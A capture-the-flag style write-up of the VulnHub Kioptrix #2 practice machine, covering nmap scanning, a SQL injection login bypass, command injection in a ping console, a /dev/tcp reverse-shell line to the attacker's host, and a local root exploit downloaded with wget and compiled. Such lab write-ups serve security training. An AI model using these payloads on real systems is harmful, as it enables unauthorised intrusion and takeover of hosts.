---
title: "VulnHub - Kioptrix #2"
author: Nasrallah
description: ""
date: 2022-12-27 00:00:00 +0000
categories: [VulnHub]
tags: [vulnhub, linux, easy, commandinjection, sqli]
img_path: /assets/img/vulnhub/kioptrix2
---


---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Kioptrix level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) from [VulnHub](https://www.vulnhub.com/).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 192.168.56.9                                              
Host is up (0.00018s latency).    
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION 
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:                                                                 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind    2 (RPC #100000)                                                                                                                     
| rpcinfo:                                                                     
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind     
|   100000  2            111/udp   rpcbind
|   100024  1            924/udp   status
|_  100024  1            927/tcp   status
443/tcp  open  ssl/https?
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2022-12-13T22:33:08+00:00; +4h59m59s from scanner time.
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
927/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 08:00:27:82:C2:D8 (Oracle VirtualBox virtual NIC)
```

We found a couple of open ports running multiple services on Linux CentOS. We see OpenSSH running on port 22, Apache on port 80 and mysql on port 3306.

## Web

Let's check the webpage on port 80.

![](1.png)

It's a login page.

I tried some default credentials but couldn't login but managed to do so using sql injection.`' or 1=1 --`

![](2.png)

We see a web console giving us the ability to ping machines on the network. I instantly tried to inject command and succeeded with the command `;id`.

![](3.png)

# **Foothold**

Now it's time to get a reverse shell, first we setup a netcat listener with `nc -lvnp 1234` and then submit the following command in the web console.

```bash
;sh -i >& /dev/tcp/192.168.56.1/1234 0>&1
```

![](4.png)

After that i upgraded the shell using python pty.

![](5.png)

# **Privilege Escalation**

We saw earlier from the nmap scan that the linux flavor of the machine is `CentOS`, let's check it's version with `lsb_release -a`.

```bash
bash-3.00$ lsb_release -a
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
Codename:       Final

```

Let's check if this version has any exploits

![](6.png)

We found multiple privilege escalation exploits but the one that's gonna work is `linux/local/9545.c` so we copy it to our current folder using the command `searchsploit -m linux/local/9545.c`

After that we need to upload it to target, we do that using `python3 -m http.server` to serve the file and `wget` to download it from the target.

![](7.png)

Now we need to compile using this command `gcc 9545.c -o exploit` and then run it.

![](8.png)

Great! The exploit worked and we got a root shell.



---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
